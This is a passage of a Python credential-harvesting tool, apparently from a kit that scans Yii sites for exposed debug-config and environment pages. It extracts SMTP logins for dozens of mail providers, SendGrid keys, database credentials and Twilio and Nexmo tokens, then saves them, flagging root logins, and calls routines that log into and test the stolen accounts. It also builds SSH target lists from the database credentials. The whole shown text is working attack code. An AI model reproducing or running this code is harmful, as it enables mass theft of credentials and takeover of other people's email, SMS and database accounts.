					save = open('Result(Yii)/SMTP(OFFICE365).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '1and1' in str(get_smtp) or '1und1' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(1AND1).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'zoho' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ZOHO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mandrillapp' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MANDRILL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mailgun' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MAILGUN).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.it' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ITALY).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'emailsrvr' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RACKSPACE).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hostinger' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HOSTINGER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.yandex' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(YANDEX).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.OVH' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(OVH).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.ionos' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(IONOS).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'zimbra' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ZIMBRA).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'kasserver.com' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(KASSASERVER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'smtp-relay.gmail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'sparkpostmail.com' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SPARKPOST).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '.jp' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(JAPAN).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'gmoserver' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GMO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1

				elif 'mailjet' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MAILJET).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'gmail.com' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'googlemail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GOOGLEMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'aruba.it' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ARUBA).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hetzner' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HETZNER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '163' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(163).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif '263' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(263).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'Aliyun' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ALIYUN).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'att.net' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ATTNET).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'chinaemail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(CHINAEMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'comcast' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(COMCAST).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'cox.net' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(COX).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'earthlink' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(EARTH).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'global-mail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GLOBAL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'gmx' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GMX).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'godaddy' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(GODADDY).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hinet' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HINET).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'hotmail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HOTMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mail.ru' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MAILRU).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mimecast' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'mweb' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(MWEB).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'netease' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(NETEASE).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'NetworkSolutions' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(NETWORK).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'outlook' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(HOTMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'qq' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(QQ).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'sina-email' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SINA).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'strato' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(STRATO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'synaq' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SYNAQ).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'yihigher' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(YIGHER).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'zmail' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(ZMAIL).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'rise-tokyo' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RISE-TOKIO).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				elif 'tatsumi-b' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(TATSUMI).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1

				elif 'sendinblue' in str(get_smtp):
					build = str(url)+' -- '+ str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(SENDINBLUE).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				else:
					build = str(get_smtp[0])
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
					save.write(remover+'\n')
					save.close()
					sendtestoff(url, satu.split(':')[1], satu.split(':')[2], satu.split('username=')[3],
							   satu.split('password=')[4])
					smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
							   satu.split('|')[4])
					oke += 1
				return True

			else:
				return False
		except:
			return False
	def get_send2(self, text, url):
		try:
			if "sendgrid" in text:
				if "SG." in text or "apikey" in text:
					regex = re.findall('</td><td class="v">SG.(.*?)</td></tr>', text)[0]
					method = '/debug/default/view?panel=config'
					print(f"{gr}# {res}{url} {red}[{gr}DATABASE Found{red}]\n")

				build = 'apikey|SG.' + str(regex)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/SMTP(SENDGRID).txt', 'a')
				save.write(remover+'\n')
				save.close()
				ceker_sendgrid2(url, 'SG.'+str(regex))

				return True

			else:
				return False
		except:
			return False
	def get_database(self, text, url):
		try:
			if "DB_HOST" in text:
				if "DB_NAME" in text:
					method = '/.env'
					try:
						db_host = reg('DB_HOST.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						db_host = reg('DB_NAME.*<td class="v">(.*?)</td></tr>', text)[0]
					try:
						db_port = reg('DB_PORT.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('DB_DATABASE.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('DB_USERNAME.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						db_user = reg('DB_USER.*<td class="v">(.*?)</td></tr>', text)[0]
					try:
						db_pass = reg('DB_PASSWORD.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						db_pass = reg('DB_PASSWD.*<td class="v">(.*?)</td></tr>', text)[0]
				elif "<td>DB_HOST</td>" in text:
					method = 'debug'
					try:
						db_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_pass = ''
				build = 'URL: '+str(url)+'/debug/default/view?panel=config\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/DATABASE.txt', 'a')
				save.write(remover+'\n')
				save.close()
				build_forchecker = str(url)+"|"+str(db_host)+"|"+str(db_port)+"|"+str(db_user)+"|"+str(db_pass)+"|"+str(db_name)
				build_forchecker2 = str(url)+"|22|"+str(db_user)+"|"+str(db_pass)
				remover2 = str(build_forchecker).replace('\r', '')
				remover3 = str(build_forchecker2).replace('\r', '')
				if str(db_user) == "root":
					save3 = open('Result(Yii)/database_root.txt','a')
				else:
					save3 = open('Result(Yii)/database.txt','a')
				save3.write(remover2+'\n')
				save3.close()
				if str(db_user) == "root":
					save4 = open('Result(Yii)/database_ssh_root.txt','a')
				else:
					save4 = open('Result(Yii)/database_ssh.txt','a')
				save4.write(remover3+'\n')
				save4.close()
				return True
			else:
				return False
		except:
			return False
	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID" in text:
					method = '/.env'
					try:
						acc_sid = reg('TWILIO_ACCOUNT_SID.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('TWILIO_AUTH_TOKEN.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_key = ''

				elif 'TWILIO_KEY_SID' in text:
					method = 'debug'
					try:
						acc_sid = reg('TWILIO_ACCOUNT_SID.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('TWILIO_AUTH_TOKEN.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_key = ''
				build_forchecker = str(acc_sid)+"|"+str(acc_key)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('Result(Yii)/Apache(TWILIO).txt','a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio1(acc_sid, acc_key)
				return True
			elif "TWILIO_SID_KEY" in text:
				if "TWILIO_SID_KEY" in text:
					method = '/.env'
					try:
						acc_sid = reg('TWILIO_SID_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('TWILIO_TOKEN.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						authtoken = ''

				elif "TWILIO_SID" in text:
					method = 'debug'
					try:
						acc_sid = reg('TWILIO_SID.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('TWILIO_AUTHTOKEN.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						authtoken = reg('TWILIO_TOKEN.*<td class="v">(.*?)</td></tr>', text)[0]
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('Result(Yii)/Apache(TWILIO).txt','a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio1(acc_sid, authtoken)

				return True
			elif "=AC" in text:
				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open(o_twiliom, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_nexmo(self, text, url):
		try:
			if "NEXMO_APIKEY" in text:
				if "NEXMO_APIKEY" in text:
					method = '/.env'
					try:
						acc_sid = reg('NEXMO_APIKEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('NEXMO_APISECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_key = ''

				elif 'NEXMO_API_KEY' in text:
					method = 'debug'
					try:
						acc_sid = reg('NEXMO_API_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('NEXMO_API_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_key = ''
				build_forchecker = str(acc_sid)+"|"+str(acc_key)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('Result(Yii)/Apache(NEXMO).txt','a')
				save2.write(remover2+'\n')
				save2.close()
				login_nexmo(url, acc_sid, acc_key)
				return True
			else:
				return False
		except:
			return False
	def get_alllegion(self, text, url):
		try:
			if "TWILIO" in text or "twilio" in text or 'class="v">AC' in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)TWILIO.txt', 'a')
				save.write(remover+'\n')
				save.close()

			elif "plivo" in text or "PLIVO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)PLIVO.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "plivo" in text or "PLIVO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)PLIVO.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "plivo" in text or "PLIVO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)PLIVO.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "plivo" in text or "PLIVO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)PLIVO.txt', 'a')
				save.write(remover+'\n')
				save.close()

			elif "sms.to" in text or "smsto" in text or "SMSTO" in text or "SMS.TO" in text:
